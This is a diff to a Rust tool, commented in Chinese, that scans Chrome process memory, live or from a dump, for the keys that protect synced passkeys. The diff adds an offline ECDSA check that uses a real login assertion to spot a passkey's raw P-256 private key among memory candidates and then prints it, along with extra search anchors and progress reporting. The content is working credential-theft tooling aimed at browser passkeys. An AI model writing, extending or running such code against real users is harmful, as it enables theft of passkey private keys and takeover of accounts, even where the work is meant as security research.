@@ -21,15 +21,22 @@ use std::collections::HashSet;
 use std::fs::File;
 use std::path::PathBuf;
 use std::sync::Mutex;
+use std::sync::atomic::{AtomicUsize, Ordering};
 
 use aes_gcm::aead::{Aead, KeyInit, Payload};
 use aes_gcm::{Aes256Gcm, Nonce};
+use base64::Engine;
+use base64::engine::general_purpose::URL_SAFE_NO_PAD;
 use clap::Parser;
 use hkdf::Hkdf;
 use memchr::memmem;
 use memmap2::Mmap;
 use rayon::prelude::*;
-use sha2::Sha256;
+use sha2::{Digest, Sha256};
+
+use p256::elliptic_curve::PrimeField as _;
+use p256::elliptic_curve::ops::Reduce as _;
+use p256::elliptic_curve::sec1::ToEncodedPoint as _;
 
 const HKDF_INFO: &[u8] = b"KeychainApplicationKey:gmscore_module:com.google.android.gms.fido";
 const AAD: &[u8] = b"WebauthnCredentialSpecifics.Encrypted";
@@ -42,6 +49,11 @@ const PKCS8_P256_PREFIX: [u8; 36] = [
     0x01, 0x01, 0x04, 0x20,
 ];
 const MAX_ANCHOR_HITS: usize = 10000;
+/// P-256 曲线阶 n，用于验签命中时 x mod n 的边界比较
+const P256_ORDER: [u8; 32] = [
+    0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0xbc, 0xe6, 0xfa, 0xad, 0xa7, 0x17, 0x9e, 0x84, 0xf3, 0xb9, 0xca, 0xc2, 0xfc, 0x63, 0x25, 0x51,
+];
 
 #[derive(Parser)]
 #[command(about = "在 Chrome 进程内存中通过锚点定位 passkey 安全域密钥（SDS），并用已知密文试解密验证")]
@@ -69,12 +81,17 @@ struct Args {
     /// 忽略锚点，按对齐步长全量扫描（仅建议小 dump；live 模式下很慢）
     #[arg(long)]
     full_scan: bool,
+    /// 真实断言 JSON 文件（含 authenticatorData/clientDataJSON/signature，b64url）；
+    /// 提供后额外把候选当 P-256 私钥做离线验签，可直接定位私钥本身
+    #[arg(long)]
+    oracle_json: Option<PathBuf>,
 }
 
 struct Reference {
     ciphertext: Vec<u8>,
     anchors: Vec<Vec<u8>>,
     credential_id: Option<Vec<u8>>,
+    key_version: Option<i64>,
 }
 
 struct Hit {
@@ -88,11 +105,13 @@ struct Hit {
 struct ScanCtx<'a> {
     ciphertext: &'a [u8],
     anchors: &'a [Vec<u8>],
+    oracle: Option<&'a EcdsaOracle>,
     window: usize,
     align: usize,
     full_scan: bool,
     seen: Mutex<HashSet<u64>>,
     hits: Mutex<Vec<Hit>>,
+    scanned: AtomicUsize,
 }
 
 fn hex_decode(s: &str) -> Result<Vec<u8>, String> {
@@ -117,6 +136,7 @@ fn load_reference_material(jsonl_path: &PathBuf) -> Result<Reference, String> {
     let mut ciphertext = None;
     let mut anchors = Vec::new();
     let mut credential_id = None;
+    let mut key_version = None;
 
     for line in text.lines() {
         let record: serde_json::Value =
@@ -145,6 +165,9 @@ fn load_reference_material(jsonl_path: &PathBuf) -> Result<Reference, String> {
         if let Some(rp_id) = decoded["rp_id"].as_str() {
             anchors.push(rp_id.as_bytes().to_vec());
         }
+        if let Some(kv) = decoded["key_version"].as_i64() {
+            key_version = Some(kv);
+        }
     }
     let ciphertext =
         ciphertext.ok_or_else(|| format!("{jsonl_path:?} 中找不到 field 12 加密载荷"))?;
@@ -152,6 +175,7 @@ fn load_reference_material(jsonl_path: &PathBuf) -> Result<Reference, String> {
         ciphertext,
         anchors,
         credential_id,
+        key_version,
     })
 }
 
@@ -178,6 +202,101 @@ fn try_decrypt(key: &[u8; 32], ciphertext: &[u8]) -> Option<Vec<u8>> {
             },
         )
         .ok()
+}
+
+fn b64url_decode(s: &str) -> Result<Vec<u8>, String> {
+    URL_SAFE_NO_PAD
+        .decode(s.trim())
+        .map_err(|e| format!("base64url 解码失败: {e}"))
+}
+
+/// 用真实登录断言做离线验签预言机：直接把候选 32 字节当 P-256 私钥。
+///
+/// 验签数学：签名 (r, s)，消息哈希 m，w = s⁻¹，u1 = m·w，u2 = r·w 全部预计算；
+/// 每个候选 d 只需算 (u1 + u2·d)·G 并比较 x 坐标与 r（mod n），一次定基点标量乘。
+struct EcdsaOracle {
+    u1: p256::Scalar,
+    u2: p256::Scalar,
+    r: [u8; 32],
+    verifying_msg: Vec<u8>,
+    signature_der: Vec<u8>,
+}
+
+impl EcdsaOracle {
+    fn from_json(path: &PathBuf) -> Result<Self, String> {
+        let text = std::fs::read_to_string(path).map_err(|e| format!("读取 {path:?} 失败: {e}"))?;
+        let v: serde_json::Value =
+            serde_json::from_str(&text).map_err(|e| format!("JSON 解析失败: {e}"))?;
+        let get = |k: &str| -> Result<Vec<u8>, String> {
+            b64url_decode(v[k].as_str().ok_or_else(|| format!("缺少字段 {k}"))?)
+        };
+        let auth_data = get("authenticatorData")?;
+        let client_data = get("clientDataJSON")?;
+        let sig_bytes = get("signature")?;
+
+        let sig = p256::ecdsa::Signature::from_der(&sig_bytes)
+            .map_err(|e| format!("签名 DER 解析失败: {e}"))?;
+        let (r_bytes, s_bytes) = sig.split_bytes();
+        let r = p256::Scalar::from_repr(r_bytes).into_option().ok_or("r 非法")?;
+        let s = p256::Scalar::from_repr(s_bytes).into_option().ok_or("s 非法")?;
+        let w = s.invert().into_option().ok_or("s 不可逆")?;
+
+        let mut msg = auth_data;
+        msg.extend_from_slice(&Sha256::digest(&client_data));
+        let m_hash = Sha256::digest(&msg);
+        let m = p256::Scalar::reduce_bytes(p256::FieldBytes::from_slice(&m_hash));
+
+        Ok(Self {
+            u1: m * w,
+            u2: r * w,
+            r: r_bytes.into(),
+            verifying_msg: msg,
+            signature_der: sig_bytes,
+        })
+    }
+
+    /// 快速筛选：一次标量乘 + x 坐标比较（含 x ≥ n 时减 n 的边界情况）
+    fn matches(&self, candidate: &[u8; 32]) -> bool {
+        let Some(d) = p256::Scalar::from_repr(*p256::FieldBytes::from_slice(candidate))
+            .into_option()
+        else {
+            return false;
+        };
+        let point = (p256::ProjectivePoint::GENERATOR * (self.u1 + self.u2 * d)).to_affine();
+        let encoded = point.to_encoded_point(false);
+        let Some(x) = encoded.x() else { return false };
+        let x: &[u8] = x.as_slice();
+        if x == self.r.as_slice() {
+            return true;
+        }
+        // x mod n 边界：x ∈ [n, p) 时 r = x - n
+        let mut xb: [u8; 32] = <[u8; 32]>::try_from(x).unwrap();
+        if xb >= P256_ORDER {
+            let mut borrow = 0i16;
+            for i in (0..32).rev() {
+                let diff = xb[i] as i16 - P256_ORDER[i] as i16 - borrow;
+                xb[i] = (diff & 0xff) as u8;
+                borrow = (diff < 0) as i16;
+            }
+            if xb == self.r {
+                return true;
+            }
+        }
+        false
+    }
+
+    /// 命中后用完整 ECDSA 验签复核，消除假阳性
+    fn confirm(&self, candidate: &[u8; 32]) -> bool {
+        use p256::ecdsa::signature::Verifier as _;
+        let Ok(sk) = p256::SecretKey::from_slice(candidate) else {
+            return false;
+        };
+        let vk = p256::ecdsa::VerifyingKey::from(&sk.public_key());
+        let Ok(sig) = p256::ecdsa::Signature::from_der(&self.signature_der) else {
+            return false;
+        };
+        vk.verify(&self.verifying_msg, &sig).is_ok()
+    }
 }
 
 /// Minimal protobuf wire parser: returns length-delimited (wire type 2) values
@@ -298,10 +417,14 @@ fn scan_buffer(data: &[u8], base: u64, ctx: &ScanCtx) {
         return;
     }
 
-    // 并行试解密：GCM tag 校验是决定性判据
+    // 并行试解密：GCM tag 校验是决定性判据；提供 oracle 时另做 ECDSA 验签
     let chunk_hits: Vec<Hit> = candidates
         .par_iter()
         .filter_map(|(pos, _why)| {
+            let done = ctx.scanned.fetch_add(1, Ordering::Relaxed) + 1;
+            if done % 5_000_000 == 0 {
+                eprintln!("  进度: {} 候选已试", done);
+            }
             let candidate: [u8; 32] = data[*pos..*pos + 32].try_into().unwrap();
             if let Some(plaintext) = try_decrypt(&candidate, ctx.ciphertext) {
                 Some(Hit {
@@ -310,13 +433,26 @@ fn scan_buffer(data: &[u8], base: u64, ctx: &ScanCtx) {
                     candidate,
                     plaintext,
                 })
-            } else {
-                try_decrypt(&derive_key(&candidate), ctx.ciphertext).map(|plaintext| Hit {
+            } else if let Some(plaintext) = try_decrypt(&derive_key(&candidate), ctx.ciphertext) {
+                Some(Hit {
                     offset: base + *pos as u64,
                     mode: "sds+hkdf",
                     candidate,
                     plaintext,
                 })
+            } else if let Some(oracle) = ctx.oracle {
+                if oracle.matches(&candidate) && oracle.confirm(&candidate) {
+                    Some(Hit {
+                        offset: base + *pos as u64,
+                        mode: "ecdsa-oracle",
+                        candidate,
+                        plaintext: Vec::new(),
+                    })
+                } else {
+                    None
+                }
+            } else {
+                None
             }
         })
         .collect();
@@ -328,6 +464,16 @@ fn print_hits(hits: &mut Vec<Hit>, credential_id: Option<&[u8]>) {
     for hit in hits {
         println!("\n[+] 命中 @ {:#x}, 模式: {}", hit.offset, hit.mode);
         println!("    candidate: {}", hex_encode(&hit.candidate));
+        if hit.mode == "ecdsa-oracle" {
+            // 候选本身就是私钥 scalar，打印推导的公钥便于人工比对
+            if let Ok(sk) = p256::SecretKey::from_slice(&hit.candidate) {
+                let pub_bytes = sk.public_key().to_sec1_bytes();
+                println!("    private_key_scalar: {}", hex_encode(&hit.candidate));
+                println!("    derived_public_key: {}", hex_encode(&pub_bytes));
+            }
+            println!("    => 离线验签通过：这就是该 passkey 的真实私钥");
+            continue;
+        }
         for (field, value) in parse_proto_bytes_fields(&hit.plaintext, &[1, 2, 3]) {
             let name = match field {
                 1 => "private_key_pkcs8",
@@ -440,15 +586,16 @@ mod live {
     /// 枚举进程的可读内存区域，分块（带重叠）读出并交给回调。
     /// 覆盖 PRIVATE（堆，SDS 所在）、IMAGE（chrome.dll，常量字符串锚点所在）
     /// 和 MAPPED（LevelDB 等映射文件，密文锚点所在）。
-    /// 返回 (区域数, 读取字节数)。
+    /// 返回 (区域数, 读取字节数, 读取失败块数)。
     pub fn for_each_chunk<F: FnMut(&[u8], u64)>(
         handle: HANDLE,
         overlap: usize,
         mut f: F,
-    ) -> (u64, u64) {
+    ) -> (u64, u64, u64) {
         let overlap = overlap.max(MIN_OVERLAP);
         let mut regions = 0u64;
         let mut total = 0u64;
+        let mut read_failures = 0u64;
         let mut buf = vec![0u8; CHUNK + overlap];
         let mut address: usize = 0;
         unsafe {
@@ -481,6 +628,8 @@ mod live {
                         if ok != 0 && read > 0 {
                             total += read as u64;
                             f(&buf[..read], (base + offset) as u64);
+                        } else {
+                            read_failures += 1;
                         }
                         if want <= overlap {
                             break;
@@ -494,7 +643,7 @@ mod live {
                 address = next;
             }
         }
-        (regions, total)
+        (regions, total, read_failures)
     }
 }
 
@@ -518,6 +667,7 @@ fn main() {
             ciphertext,
             anchors: Vec::new(),
             credential_id: None,
+            key_version: None,
         }
     } else {
         let reference = load_reference_material(&args.jsonl).unwrap_or_else(|e| {
@@ -534,10 +684,17 @@ fn main() {
 
     let mut anchors = vec![
         HKDF_INFO.to_vec(),
+        b"KeychainApplicationKey".to_vec(),
         AAD.to_vec(),
+        b"hw_protected".to_vec(),
         PKCS8_P256_PREFIX.to_vec(),
     ];
     anchors.extend(reference.anchors.iter().cloned());
+    // key_version（epoch）以小端 u32 出现在 SDS 缓存结构里，也是一个锚点
+    if let Some(kv) = reference.key_version {
+        anchors.push((kv as i32).to_le_bytes().to_vec());
+        eprintln!("已加入 key_version 锚点: {} (LE: {})", kv, hex_encode(&(kv as i32).to_le_bytes()));
+    }
     for hex in &args.anchor_hex {
         match hex_decode(hex) {
             Ok(a) => anchors.push(a),
@@ -548,14 +705,28 @@ fn main() {
         }
     }
 
+    let oracle = match &args.oracle_json {
+        Some(path) => {
+            let o = EcdsaOracle::from_json(path).unwrap_or_else(|e| {
+                eprintln!("错误: oracle 文件无效: {e}");
+                std::process::exit(2);
+            });
+            eprintln!("已载入真实断言 oracle，候选将同时做 ECDSA 离线验签（直接找私钥）");
+            Some(o)
+        }
+        None => None,
+    };
+
     let ctx = ScanCtx {
         ciphertext: &reference.ciphertext,
         anchors: &anchors,
+        oracle: oracle.as_ref(),
         window: args.window,
         align: args.align,
         full_scan: args.full_scan,
         seen: Mutex::new(HashSet::new()),
         hits: Mutex::new(Vec::new()),
+        scanned: AtomicUsize::new(0),
     };
 
     #[cfg(windows)]
@@ -575,15 +746,16 @@ fn main() {
         );
         for proc in &procs {
             eprintln!("扫描 PID {} ...", proc.pid);
-            let (regions, bytes) =
+            let (regions, bytes, read_failures) =
                 live::for_each_chunk(proc.handle, args.window, |chunk, base| {
                     scan_buffer(chunk, base, &ctx)
                 });
             eprintln!(
-                "  PID {}: {} 个内存区域, {:.1} MB",
+                "  PID {}: {} 个内存区域, {:.1} MB, {} 块读取失败",
                 proc.pid,
                 regions,
-                bytes as f64 / 1e6
+                bytes as f64 / 1e6,
+                read_failures
             );
             if bytes < 100_000_000 {
                 eprintln!(
